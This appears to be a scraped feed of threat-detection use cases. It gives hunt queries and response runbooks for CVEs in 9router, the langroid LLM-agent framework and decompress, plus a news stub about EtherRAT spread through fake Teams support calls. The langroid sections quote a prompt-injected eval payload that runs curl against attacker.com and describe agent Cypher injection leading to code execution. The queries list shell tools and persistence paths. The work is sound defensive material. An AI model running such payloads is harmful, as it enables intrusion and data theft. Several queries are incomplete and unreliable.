9router unauthenticated full DB export via GET /api/settings/database (CVE-2026-55500) AIActions on Objectives High
Hunts requests to the 9router (npm 9router <= 0.4.71) /api/settings/database export endpoint on port 20128, which returns the complete database with plaintext API keys, OAuth tokens and OIDC client secrets to any session that passed the weak ALWAYS_PROTECTED check (default password 123456). Article-specific because it keys on the fixed endpoint path, the app's fixed port, and the abnormally large JSON response body of a full secret dump. Rationale: Keys on the fixed endpoint path /api/settings/database, the app's fixed listen port 20128 and the oversized JSON response body that only a full apiKeys/providerConnections/settings dump produces — all corroborated by the GHSA advisory. Excludes POST so it isolates the credential-export (GET) leg. Cross-checked against: • https://github.com/advisories/GHSA-qvfm-67h2-2qfx • https://www.npmjs.com/package/9router
ATT&CKT1552.001 T1213 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate operator taking a manual backup via the built-in export before an upgrade
  • Automated backup/cron job that periodically GETs the export endpoint
  • Security scanner or internal pentest crawling the 9router admin API
  • Health-check/monitoring probe hitting /api/settings/* endpoints
  • Developer testing the export feature in a staging instance
Suppression filter
| where InitiatingProcessCommandLine !has "backup" and AccountName !endswith "$"
Response runbook
Step 1 (triage): Identify the source IP/UA of the GET. Confirm whether it is a known backup job or an unfamiliar/external client (curl, non-browser UA) and whether the 9router instance is tunnel/internet-exposed on 20128. Step 2 (contain): Treat every stored secret as compromised — rotate all provider API keys, OAuth tokens and OIDC client secrets, change the admin password off the default 123456, and firewall port 20128 to trusted admins only. Upgrade 9router past 0.4.71. Step 3 (hunt): Search for a subsequent POST to /api/settings/database from the same source (import/persistence), for successful logins immediately after, and for use of the exfiltrated keys against downstream providers.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("curl.exe","wget.exe","powershell.exe","pwsh.exe")
| where ProcessCommandLine has "/api/settings/database"
| where not(ProcessCommandLine has_any ("-X POST","--request POST","--data","-d ","-Method Post","-Method POST"))   // GET export, exclude POST import
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(30d)
| where Url has "/api/settings/database"
| where HttpMethod =~ "GET"
| where HttpResponseBodyBytes > 5000   // full DB dump is a large body vs a normal settings read
| project TimeGenerated, SrcIpAddr, DstIpAddr, DstPortNumber, Url, HttpMethod, HttpStatusCode, HttpResponseBodyBytes, HttpRequestHeaderUserAgent
| order by HttpResponseBodyBytes desc

9router malicious DB import (wipe-and-replace / password-hash overwrite) via POST /api/settings/database (CVE-2026-55500) AIInstallation High
Hunts POST requests to the 9router (npm 9router <= 0.4.71) /api/settings/database import endpoint, which performs an unauthenticated transactional wipe-and-replace of every table — including the stored password hash — enabling attacker persistence and destructive database takeover. Article-specific because it keys on the fixed endpoint path plus the POST/body-carrying verb that distinguishes the destructive import from a read-only export. Rationale: Keys on the fixed /api/settings/database path plus the POST/body-carrying verb that the advisory identifies as the destructive import leg (transactional DELETE-then-INSERT overwriting the password hash). A POST to this route is never benign on a patched deployment, warranting an alerting tier. Cross-checked against: • https://github.com/advisories/GHSA-qvfm-67h2-2qfx • https://www.npmjs.com/package/9router
ATT&CKT1556 T1485 T1565.001
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Operator restoring a legitimate backup via the import feature after a migration
  • Blue-team/pentest validating the CVE in an authorized test window
  • Configuration-management tooling pushing settings via the import API
  • Disaster-recovery runbook re-seeding a rebuilt 9router instance
  • QA automation exercising the import endpoint in staging
Suppression filter
| where InitiatingProcessCommandLine !has "restore" and AccountName !endswith "$"
Response runbook
Step 1 (triage): Confirm the POST source IP/UA and whether any authorized backup-restore or migration was scheduled. Check the 9router settings table for an unexpected password-hash change and for record counts dropping to near-zero (wipe). Step 2 (contain): Isolate the host, revoke active sessions, restore the database from a known-good backup, force-reset the admin credential off default 123456, and block port 20128 externally; upgrade past 0.4.71. Step 3 (hunt): Look for a preceding GET export from the same source (credential theft), successful logins immediately after the import (attacker's new password), and downstream abuse of any provider tokens that were present before the wipe.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("curl.exe","wget.exe","powershell.exe","pwsh.exe")
| where ProcessCommandLine has "/api/settings/database"
| where ProcessCommandLine has_any ("-X POST","--request POST","--data","-d ","-Method Post","-Method POST","Invoke-RestMethod","Invoke-WebRequest")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(30d)
| where Url has "/api/settings/database"
| where HttpMethod =~ "POST"
| project TimeGenerated, SrcIpAddr, DstIpAddr, DstPortNumber, Url, HttpMethod, HttpStatusCode, HttpRequestBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Neo4j server (java) spawning an OS command interpreter — APOC/dbms RCE ceiling AIExploitation High
Hunts the Neo4j database process (java hosting org.neo4j) spawning cmd/powershell/bash/wscript children. Neo4j should never launch a shell; when APOC or dbms.security procedures are granted, Langroid's unvalidated Cypher path lets an attacker reach the OS-command primitive (the Cypher analogue of COPY...FROM PROGRAM), so a shell child of the Neo4j JVM is the RCE ceiling of CVE-2026-55615. Rationale: Anchors on the Neo4j JVM (parent path/cmdline contains 'neo4j') spawning a shell — a relationship that legitimate Neo4j never produces, directly detecting the advisory's stated APOC/dbms OS-command RCE ceiling. High-fidelity because it requires the specific parent (Neo4j) plus a shell child, not either alone. Cross-checked against: • https://github.com/advisories/GHSA-mxfr-6hcw-j9rq
ATT&CKT1190 T1059
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • APOC procedures legitimately shelling out for sanctioned admin scripts
  • Neo4j start/stop wrapper scripts invoking cmd/bash during service lifecycle
  • Monitoring/backup agents launched under the Neo4j service account
  • DBA running diagnostics from within the Neo4j process context
  • Custom user-defined Neo4j procedures that intentionally exec helpers
Suppression filter
| where not (ProcessCommandLine has_any ("neo4j-admin","neo4j.bat","neo4j start","neo4j stop"))
Response runbook
1) Triage: capture the child process command line and the Neo4j session/query that immediately preceded it; determine if a Langroid agent issued Cypher just before. 2) Contain: kill the child process, isolate the Neo4j host, rotate DB credentials, and revoke APOC/dbms.security grants from the DB role; upgrade langroid to >=0.65.5. 3) Hunt: pivot on the child's SHA256 and any outbound connections it made, review query.log for apoc.*/dbms.* calls in the same window, and check for dropped files or persistence created by the spawned shell.
DeviceProcessEvents

| where InitiatingProcessFileName has_any ("java.exe","java","neo4j.exe")
| where InitiatingProcessCommandLine has "neo4j"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","bash.exe","sh.exe","wscript.exe","cscript.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| sort by Timestamp desc

| where EventID == 4688

Exposure hunt: vulnerable Langroid (<=0.65.4) with Neo4jChatAgent — CVE-2026-55615 AIWeaponization High
Surfaces hosts running the vulnerable pip:langroid package (<=0.65.4) that ships the unguarded Neo4jChatAgent Cypher sink. This is the exposure-management pivot: knowing which endpoints could be exploited before an injection attempt lands, so the fleet can be upgraded to 0.65.5. Rationale: Uses the concrete tracked identifier CVE-2026-55615 and affected range (pip:langroid <=0.65.4) named in the advisory to enumerate exposed assets deterministically. Defender/Sentinel TVM tables carry the CVE mapping once the vuln feed ingests it; low FP because it is an exact CVE-id match. Cross-checked against: • https://github.com/advisories/GHSA-mxfr-6hcw-j9rq
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Isolated dev/test hosts where langroid is present but Neo4jChatAgent is never enabled
  • Vendored copy already patched to 0.65.5 but stale inventory not yet refreshed
  • Container-only installs not represented in device software inventory
  • langroid installed transitively but the neo4j extra never imported
Response runbook
1) Triage: confirm the host actually instantiates Neo4jChatAgent (not just langroid installed) and whether the connected Neo4j role has APOC/dbms.security granted. 2) Contain: prioritize upgrade to pip:langroid 0.65.5; where upgrade lags, set the agent's Neo4j role to least-privilege read-only and disable CypherCreationTool. 3) Hunt: on any host that also shows dangerous Cypher in query.log or a Neo4j-spawned shell (companion UCs), escalate to active-exploitation investigation.

Unauthenticated read of 9router credential/usage API endpoints (API-key & conversation leak) AIActions on Objectives High
Hunts anonymous HTTP GETs that return 200 against 9router's unauthenticated data-leak endpoints (/api/usage/stats, /api/providers, /api/usage/request-logs, /api/usage/request-details/:id). These endpoints in 9router <=0.4.41 return full plaintext provider API keys (sk-...), GitHub Copilot OAuth tokens, and other users' full conversation contents with no auth check. Rationale: Uses the exact unauthenticated data-leak endpoint paths named in the advisory's Affected Endpoints table (/api/usage/stats, /api/usage/request-logs, /api/usage/request-details/:id, /api/providers). Pairing the specific paths + 200 + empty proxy principal is high-fidelity because these routes ship full plaintext sk- keys and conversation bodies. Cross-checked the 9router repo's own auth-bypass issues confirming the missing-auth pattern. Cross-checked against: • https://github.com/decolua/9router/issues/431 • https://github.com/advisories/GHSA-xrrh-p7f2-27vm
ATT&CKT1190 T1552
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate 9router admin loading the usage dashboard where SPA-level auth isn't recorded in web-server logs, so csUsername is empty
  • Vulnerability scanners (Nessus/Nuclei/Burp) sweeping the app
  • Uptime/health-check monitors polling /api/models or /api/providers
  • Internal load-balancer or reverse-proxy health probes
  • Security team validating the patch after upgrade
Suppression filter
| where not(csUserAgent has_any ("Nessus","Nuclei","Burp","zgrab","masscan","Nmap","python-requests","curl","Go-http-client"))
Response runbook
1) Triage: pull the source IP's full request timeline — a single dashboard load hits a few paths, automated harvesting walks /api/usage/stats then iterates /api/usage/request-details/:id. Compare IP/ASN to known admin ranges and check for empty csUsername across the session. 2) Contain: block the source IP at the WAF/reverse proxy and remove the 9router instance from public exposure (put behind an auth proxy); upgrade past 0.4.41. 3) Hunt: rotate ALL provider API keys (sk-...) and GitHub Copilot OAuth tokens returned by these endpoints, check the upstream provider accounts for anomalous usage, and pivot to look for POST/PUT/DELETE to /api/providers from the same IP (rogue-provider injection).
W3CIISLog
| where TimeGenerated > ago(7d)
| where csMethod == "GET"
| where scStatus == 200
| where csUriStem in~ ("/api/usage/stats","/api/providers","/api/usage/request-logs")
    or csUriStem startswith "/api/usage/request-details"
    or csUriStem startswith "/api/providers/"
| where isempty(csUsername) or csUsername == "-"   // no authenticated principal at proxy = unauthenticated hit
| project TimeGenerated, cIP, csMethod, csUriStem, csUriQuery, scStatus, csUsername, csUserAgent, sSiteName, sPort
| sort by TimeGenerated desc

Unauthenticated provider CRUD tampering on 9router /api/providers (rogue provider / key swap / DoS) AIActions on Objectives High
Hunts anonymous state-changing HTTP requests (POST/PUT/DELETE) to 9router's /api/providers routes, which lack authentication in <=0.4.41. An attacker uses POST to inject a rogue provider that proxies traffic through their server, PUT to swap in attacker-controlled API keys/redirect traffic, or DELETE to remove all providers and cause denial of service. Rationale: Targets the exact write verbs and route named in the advisory's reproduction steps (POST/PUT/DELETE on /api/providers and /api/providers/:id). State-changing methods against this specific unauthenticated route are inherently rare and high-fidelity — the reproduction curl uses precisely these method+path combinations to inject 'sk-attacker-controlled' providers or delete connections. Cross-checked against: • https://github.com/decolua/9router/issues/431 • https://github.com/advisories/GHSA-xrrh-p7f2-27vm
ATT&CKT1190 T1565.001
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • 9router admin creating/editing a provider through the UI where SPA auth isn't logged at the proxy, leaving csUsername empty
  • IaC or config-management automation provisioning provider connections via API with a bearer token
  • Penetration test or patch-validation exercising the write endpoints
  • Backup/restore tooling recreating provider connections after a migration
  • Browser CORS preflight OPTIONS misclassified — verify method is truly POST/PUT/DELETE not OPTIONS
Suppression filter
| where not(csUserAgent has_any ("Nessus","Nuclei","Burp","zgrab","masscan","Nmap","python-requests","Go-http-client"))
Response runbook
1) Triage: identify the method and target — a POST means a rogue provider was added, PUT means a key/endpoint swap on an existing UUID, DELETE means removal (possible DoS). GET /api/providers and diff the live provider list against a known-good baseline to see what changed. 2) Contain: block the source IP at the WAF, delete any rogue provider connections, restore legitimate providers, and take the instance off the public network or front it with authentication; upgrade past 0.4.41. 3) Hunt: rotate all provider API keys and OAuth tokens, inspect /api/usage/request-details for prompts/responses that may have been proxied through an attacker-controlled provider base URL, and review egress for connections to unknown upstream provider hosts.
W3CIISLog
| where TimeGenerated > ago(7d)
| where csMethod in ("POST","PUT","DELETE")
| where csUriStem == "/api/providers" or csUriStem startswith "/api/providers/"
| where isempty(csUsername) or csUsername == "-"   // state-changing write with no authenticated principal
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), Methods=make_set(csMethod), Paths=make_set(csUriStem), Hits=count() by cIP, csUserAgent, sSiteName
| sort by LastSeen desc

Python interpreter spawning shell/network utility (Langroid pandas_eval eval() RCE) AIExploitation Medium
Hunts the execution artifact of CVE-2026-54769: langroid's TableChatAgent/VectorStore evaluate LLM-generated expressions with eval() and an empty locals but un-scrubbed __builtins__, so a prompt-injected payload like __import__('os').system('curl http://attacker.com/pwned') runs. On the host this appears as a python interpreter forking a shell (/bin/sh -c on Linux, cmd /c on Windows) or a network tool. An AI-agent host running pandas eval should never spawn a command shell. Rationale: Pivots on the article's PoC execution chain: TableChatAgent.pandas_eval() running __import__('os').system(...) forces the langroid python host to fork /bin/sh -c or cmd /c, so parent=python + child=shell/curl is the concrete detectable artifact (the eval string itself lives in process memory, not a command line). Cross-checked the CVE-2026-25481/CVE-2025-46724 langroid RCE family and the mitigation patch commit. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://github.com/langroid/langroid/commit/0d9e4a7bb3ae2eef8d38f2e970ff916599a2b2a6 • https://github.com/advisories/GHSA-x34r-63hx-w57f • https://dailycve.com/langroid-remote-code-execution-cve-2025-46724-critical/
ATT&CKT1059.006 T1059.004 T1059.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate langroid/pandas workflows that shell out to external tools (e.g. matplotlib saving via a subprocess, git/DVC calls) from the same python host
  • Data-science notebooks/Jupyter kernels (python) where analysts run !ls, !curl, or subprocess calls interactively
  • Python-based build/CI agents invoking bash or cmd wrappers as part of pipelines
  • ML tooling that calls curl/wget to download models or datasets from a python parent
  • Config-management (Ansible/SaltStack python) legitimately spawning shells on managed hosts
Suppression filter
| where not (ProcessCommandLine has_any ("pip ","pip3 ","conda ","matplotlib","jupyter") or InitiatingProcessCommandLine has_any ("jupyter","ipykernel","ansible"))
Response runbook
1) Triage: pull the child ProcessCommandLine and parent InitiatingProcessCommandLine — confirm the child is a shell/curl and inspect the command for RCE indicators (curl/wget to external host, touch/reverse-shell, base64). Verify whether the python parent is a langroid agent host (check FolderPath, loaded modules, listening ports). 2) Contain: if the command is attacker-controlled, isolate the host, kill the python service, and rotate any credentials/API keys reachable by that process (langroid hosts often hold LLM+DB creds). Block the contacted domain/IP. 3) Hunt: sweep the org for the same python->shell pattern, review DeviceNetworkEvents for egress from the shell child, and confirm langroid is upgraded past 0.65.1 with full_eval disabled.
DeviceProcessEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("python.exe","python3.exe","python","python3","pythonw.exe")
| where FileName in~ ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh.exe","pwsh","curl","curl.exe","wget","busybox")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("python","python3","pythonw.exe")
| where TargetProcessName has_any ("sh","bash","dash","zsh","cmd.exe","powershell","pwsh","curl","wget","busybox")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc
title: Python Interpreter Spawns Shell or Network Utility (Langroid eval RCE CVE-2026-54769)

description: Detects a python interpreter spawning a command shell or network transfer tool, the execution artifact of CVE-2026-54769 langroid pandas_eval sandbox escape to RCE via os.system()
references:
  - https://github.com/advisories/GHSA-q9p7-wqxg-mrhc

date: 2026/07/07

logsource:
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '/python'
      - '/python3'
      - '\python.exe'

      - '\pythonw.exe'
  selection_child:

  condition: selection_parent and selection_child
level: high
source:windows.sysmon @EventID:1 @ParentImage:(*\python.exe OR *\Python.exe OR *\pythonw.exe OR *\python3.exe) @Image:(*\cmd.exe OR *\Cmd.exe OR *\powershell.exe OR *\PowerShell.exe OR *\pwsh.exe OR *\curl.exe OR *\Curl.exe OR *\wget.exe)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^python[0-9.]*(\.exe)?$/i
| ImageFileName=/(\/(sh|bash|dash|zsh|curl|wget|busybox)$)|(\\(cmd|powershell|pwsh|curl|wget)\.exe$)/i
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())
ENDPOINT

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("python.exe","python3.exe","python","python3","pythonw.exe")) AND (Processes.process_name IN ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh.exe","pwsh","curl","curl.exe","wget","busybox")) by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process Processes.process_id | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
Outbound egress from a Python-parented shell/curl (Langroid RCE C2 callback) AICommand & Control Medium
Complements the process-tree UC by catching the network side of CVE-2026-54769: the injected os.system() payload in the article calls out (e.g. curl http://attacker.com/pwned). This surfaces public-internet connections whose initiating process is curl/wget/shell that was itself launched by a python interpreter — the langroid agent host beaconing or pulling a stage-2. Rationale: Uses the article's PoC network action (os.system('curl http://attacker.com/pwned')) as the pivot — a python-launched curl/wget/shell reaching the public internet. Kept generic on destination because attacker.com is a placeholder in the advisory, not a confirmed IOC, so the fidelity comes from the python->transfer-tool->public-egress shape. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://github.com/advisories/GHSA-x34r-63hx-w57f
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Python ML/data apps legitimately downloading models, datasets or packages via a curl/wget subprocess to public CDNs (HuggingFace, PyPI mirrors, S3)
  • Monitoring/health-check scripts where python shells out to curl an external API endpoint
  • CI/CD python agents fetching artifacts over HTTP(S) from public registries
  • Telemetry/crash-reporting SDKs invoking curl from a python parent
  • Admin troubleshooting sessions running curl from within a python venv shell
Suppression filter
| where not (RemoteUrl has_any ("huggingface.co","pypi.org","files.pythonhosted.org","github.com","githubusercontent.com") or InitiatingProcessCommandLine has_any ("pip ","conda ","model","dataset"))
Response runbook
1) Triage: resolve RemoteIP/RemoteUrl and reputation-check it; pull InitiatingProcessCommandLine to see the exact fetched URL and whether it maps to a known-good CDN/registry or an unknown host. Correlate with the process-tree UC on the same DeviceName within a few seconds. 2) Contain: if the destination is untrusted, block the domain/IP at the proxy/firewall, isolate the host, and terminate the langroid python process. Preserve any staged file the transfer wrote. 3) Hunt: pivot on the destination across all hosts, review DeviceFileEvents for files written by the same shell/curl (stage-2 payloads), and verify langroid version and full_eval config on every agent host.

| where InitiatingProcessFileName in~ ("curl","curl.exe","wget","sh","bash","dash","powershell.exe","pwsh.exe","pwsh","busybox")
| project Timestamp, DeviceName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl

These extract untrusted archives and can write files/links outside the target directory or create setuid files. Exposure hunt to prioritise migration to @xhmikosr/decompress 11.1.3+. Rationale: Keyed on the exact CVE id (CVE-2026-53486) and the two named packages/vendor strings (@xhmikosr/decompress, decompress) from the advisory; a direct CVE match in Defender TVM is deterministic and article-specific, not a generic template. Cross-checked against: • https://github.com/advisories/GHSA-qgfr-5hqp-vrw9 • https://security.snyk.io/vuln/SNYK-JS-DECOMPRESS-557358 • https://nvd.nist.gov/vuln/detail/CVE-2020-12265
ATT&CKT1203
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Dev-only devDependency copy of decompress not reachable in the production runtime path
  • Nested transitive copy already patched at 11.1.3 but TVM version-detection lags on the nested node_modules tree
  • Package vendored/renamed in a monorepo so the version string doesn't map cleanly to the CVE
  • Air-gapped build box that never extracts attacker-influenced archives (lower real risk despite the flag)
  • TVM name-collision on an unrelated 'decompress'-named tool from a different vendor
Response runbook
Step 1 (triage): confirm the exact SoftwareVersion vs fixed lines — decompress <=4.2.1 is unmaintained (no upstream fix), @xhmikosr/decompress needs 10.2.1 or 11.1.3+; check whether the host actually extracts untrusted/downloaded archives (CI runners, install scripts, containers) and whether extraction runs as root. Step 2 (contain): pin/upgrade to @xhmikosr/decompress 11.1.3+, and where upgrade is blocked, force extraction to a non-root user so the setuid/setgid mode bug cannot create a privileged file. Step 3 (hunt): pivot to UC 'Node.js process writing to sensitive system path' on the same DeviceName to see if the escape has already been exercised; review recently extracted archives for symlink/hardlink members and unexpected mode bits.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId == "CVE-2026-53486" or (SoftwareName has "decompress" and SoftwareVendor has_any ("xhmikosr","npm","nodejs"))
| project Timestamp, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| sort by DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId == "CVE-2026-53486" or (SoftwareName has "decompress" and SoftwareVendor has_any ("xhmikosr","npm","nodejs"))
| project TimeGenerated, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| sort by DeviceName asc
Node.js extraction process writing outside its tree into sensitive system paths (decompress CVE-2026-53486) AIInstallation Medium
Detects a node/nodejs process (the runtime that drives @xhmikosr/decompress / decompress) creating or modifying files in high-value system locations that a benign archive extraction should never touch. This is the observable impact of the CVE's link-target escape (symlink redirect / hardlink) and the setuid-file drop caused by mode being applied without stripping setuid/setgid/sticky bits when extraction runs as root. Rationale: Pivots on the CVE's concrete impact strings: the extraction runtime (node/nodejs) writing outside the target dir into persistence/privesc locations (cron.d, sudoers.d, ld.so.preload, authorized_keys, systemd units, setuid-drop into /usr/local/sbin) — exactly what the symlink-redirect and setuid mode-bit flaws enable when extraction runs as root in CI/containers. Cross-checked against: • https://github.com/advisories/GHSA-qgfr-5hqp-vrw9 • https://security.snyk.io/vuln/SNYK-JS-DECOMPRESS-557358 • https://developer.android.com/privacy-and-security/risks/zip-path-traversal
ATT&CKT1548.001 T1574.006
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • `npm install -g` or node-gyp builds legitimately writing binaries into /usr/local/sbin
  • Node-based config-management / IaC tooling (e.g. custom deploy scripts) dropping systemd units into /etc/systemd/system
  • CI/CD provisioning code run under node writing authorized_keys during machine bootstrap
  • Legitimate installers using node to place /etc/profile.d shell shims
  • Container entrypoints written in node that seed cron.d jobs at startup
Suppression filter
| where not (InitiatingProcessParentFileName in~ ("npm","pnpm","yarn") and FolderPath startswith "/usr/local/sbin/")
Response runbook
Step 1 (triage): pull the InitiatingProcessCommandLine and parent (npm/yarn/pnpm/CI runner) plus the exact TargetFilePath — confirm whether this node process was extracting a downloaded/untrusted archive and whether it ran as root; inspect the written file for setuid/setgid bits (stat -c '%a') and whether it is a symlink/hardlink pointing outside the intended output dir. Step 2 (contain): quarantine/remove the dropped file, revoke any authorized_keys or sudoers entry it added, and stop the extraction job; re-run extraction as a non-root user. Step 3 (hunt): correlate with the CVE-2026-53486 exposure UC on the same host, review the source archive for link members whose targets resolve outside the output path, and sweep other build agents that pull the same archive/artifact.
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node","nodejs")
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath has_any ("/etc/cron.d/","/etc/cron.daily/","/etc/cron.hourly/","/etc/sudoers.d/","/root/.ssh/","/.ssh/authorized_keys","/etc/ld.so.preload","/etc/profile.d/","/etc/systemd/system/","/usr/local/sbin/")
| where InitiatingProcessParentFileName !in~ ("dpkg","apt","apt-get")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, ActionType, FolderPath, FileName
| sort by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("node","nodejs")
| where EventType in ("FileCreated","FileModified","FileRenamed","FileCreate")
| where TargetFilePath has_any ("/etc/cron.d/","/etc/cron.daily/","/etc/cron.hourly/","/etc/sudoers.d/","/root/.ssh/","/.ssh/authorized_keys","/etc/ld.so.preload","/etc/profile.d/","/etc/systemd/system/","/usr/local/sbin/")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, EventType, TargetFilePath, TargetFileName
| sort by TimeGenerated desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

Fake IT support calls on Microsoft Teams push EtherRAT malware

BleepingComputer
2026-07-06 13 use cases 5 techniques 5 kill-chain phases detected

Threat actors are abusing Microsoft Teams voice calls by impersonating corporate IT support staff to trick employees into installing the EtherRAT malware, giving attackers initial access to corporate networks. [...]

ATT&CKT1190 T1204.002 T1219 T1566 T1566.001
Domainscamorreado.click

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
